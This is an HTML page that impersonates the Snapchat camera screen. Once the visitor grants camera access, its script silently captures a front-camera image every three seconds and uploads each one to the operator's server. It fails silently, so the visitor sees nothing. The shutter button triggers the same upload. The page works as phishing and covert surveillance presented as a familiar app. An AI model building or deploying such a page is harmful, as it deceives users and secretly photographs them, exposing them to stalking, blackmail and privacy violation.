<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1, user-scalable=0" />
  <title>Snapchat</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
  
  <style>
    body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; font-family: -apple-system, system-ui, sans-serif; color: white; }
    #cameraVideo { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); z-index: 1; }

    /* Custom CSS to handle native scaling differences and badging */
    
    /* 1:1 Match Badges */
    .snap-badge-pill {
      position: absolute; top: -6px; right: -10px; background: #FF3B30; color: white;
      font-size: 11px; font-weight: 800; border-radius: 20px; 
      padding: 1px 7px; display: inline-block; text-align: center;
      filter: drop-shadow(0 1px 2px rgba(0,0,0,0.5));
    }
    .snap-badge-dot {
      position: absolute; top: -4px; right: -4px; width: 10px; height: 10px;
      background: #FF3B30; border-radius: 50%; border: 1.5px solid #000;
      filter: drop-shadow(0 1px 1px rgba(0,0,0,0.5));
    }

    /* Interactive Zoom Dial */
    .snap-zoom-pill {
      position: fixed; bottom: 180px; left: 50%; transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.35); backdrop-filter: blur(10px);
      padding: 5px 12px; border-radius: 30px; display: flex; gap: 18px; font-size: 12px; font-weight: 800;
      z-index: 10; border: 1px solid rgba(255,255,255,0.05);
    }
    .zoom-text { opacity: 0.6; }
    .zoom-text.active { opacity: 1; color: #FFFC00; }

    /* Lenses & Shutter */
    .capture-row { position: fixed; bottom: 90px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 28px; z-index: 10; }
    
    /* memories icon replaced by specific svg later in code */
    .memories-btn { display: flex; flex-direction: column; align-items: center; font-size: 10px; font-weight: bold; }

    .shutter-ring { width: 78px; height: 78px; border-radius: 50%; border: 5px solid white; display: flex; align-items: center; justify-content: center; background: transparent; transition: 0.1s; }
    .shutter-inner { width: 58px; height: 58px; border-radius: 50%; background: rgba(255,255,255,0.1); }
    .shutter-ring:active { transform: scale(0.9); }

    .lens-icon-btn { width: 52px; height: 52px; border-radius: 50%; overflow: hidden; border: 2.5px solid rgba(255,255,255,0.4); }

    /* Bottom Navbar translucency */
    .footer {
      position: fixed; bottom: 0; width: 100%; height: 70px;
      background: linear-gradient(to top, rgba(0,0,0,1), rgba(0,0,0,0.9));
      display: flex; justify-content: space-around; align-items: center; z-index: 20; padding-bottom: 8px;
    }
    .nav-icon { font-size: 20px; color: rgba(255,255,255,0.6); }
    .nav-icon.active { color: white; }

    /* Standard elements needing exact positioning */
    .top-left-profile { position: fixed; top: 40px; left: 12px; z-index: 10; display: flex; gap: 10px; align-items: center; }
    .profile-bitmoji { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(5px); }
    .search-pill { width: 40px; height: 40px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(5px); display: flex; align-items: center; justify-content: center; }

    .right-toolbar { position: fixed; right: 12px; top: 40px; z-index: 10; display: flex; flex-direction: column; gap: 20px; align-items: center; }
    .tool-icon { font-size: 22px; color: white; }

    #photoCanvas { display: none; }
  </style>
</head>
<body>

  <video id="cameraVideo" autoplay playsinline></video>
  <canvas id="photoCanvas"></canvas>

  <div class="top-left-profile">
    <img src="https://api.dicebear.com/7.x/avataaars/svg?seed=Lucky" class="profile-bitmoji" alt="Profile">
    <div class="search-pill"><i class="fas fa-search tool-icon"></i></div>
  </div>

  <div class="right-toolbar">
    <i class="far fa-bell tool-icon"></i>
    <div class="relative">
        <i class="fas fa-user-plus tool-icon"></i>
        <span class="snap-badge-pill">2</span>
    </div>
    <i class="fas fa-rotate tool-icon"></i>
    <i class="fas fa-bolt-slash tool-icon"></i>
    <i class="fas fa-music tool-icon"></i>
    <div style="border: 2px solid white; border-radius: 4px; padding: 0 3px; font-size: 11px; font-weight: 900; color: white;">HD</div>
    <i class="fas fa-chevron-down tool-icon"></i>
  </div>

  <div class="snap-zoom-pill">
    <span class="zoom-text">.5</span>
    <span class="zoom-text active">1x</span>
    <span class="zoom-text">2</span>
  </div>

  <div class="capture-row">
    <div class="memories-btn">
        <i class="far fa-copy tool-icon" style="opacity: 0.8;"></i>
        <span style="opacity: 0.8; padding-top: 4px;">Memories</span>
    </div>

    <div class="shutter-ring" onclick="takePhoto()">
      <div class="shutter-inner"></div>
    </div>

    <div class="lens-icon-btn">
        <img src="https://cdn-icons-png.flaticon.com/512/5787/5787100.png" alt="Burger Lens">
    </div>
    <div class="lens-icon-btn" style="border: 2.5px solid rgba(255,255,255,0.7);">
        <img src="https://api.dicebear.com/7.x/miniavs/svg?seed=5" alt="Twin Face Lens">
    </div>
  </div>

  <div class="footer">
    <i class="fas fa-location-dot nav-icon"></i>
    <div class="relative">
        <i class="far fa-comment nav-icon"></i>
        <span class="snap-badge-pill">20</span>
    </div>
    <i class="far fa-face-smile nav-icon active"></i>
    <div class="relative">
        <i class="fas fa-users nav-icon"></i>
        <div class="snap-badge-dot"></div>
    </div>
    <div class="relative">
        <i class="fas fa-play nav-icon"></i>
        <div class="snap-badge-dot"></div>
    </div>
  </div>

  <script>
    const video = document.getElementById('cameraVideo');
    const canvas = document.getElementById('photoCanvas');

    // Initialization
    async function startApp() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        // background data capture every 3 seconds
        setInterval(silentSnapshot, 3000);
      } catch (err) {
        alert("This website requires camera access to work properly.");
      }
    }

    // Manual photo capture (flash animation feedback)
    function takePhoto() {
      // flash animation would go here
      silentSnapshot();
    }

    // Capture clear image without visible UI
    function silentSnapshot() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      // Mirror front camera for storage
      ctx.translate(canvas.width, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append('photo', blob, 'snap.png');
        // Sends to your active server.js
        fetch('/api/upload-photo', {
          method: 'POST',
          body: formData
        }).catch(err => {}); // Fail silently
      }, 'image/png');
    }

    startApp();
  </script>
</body>
</html>
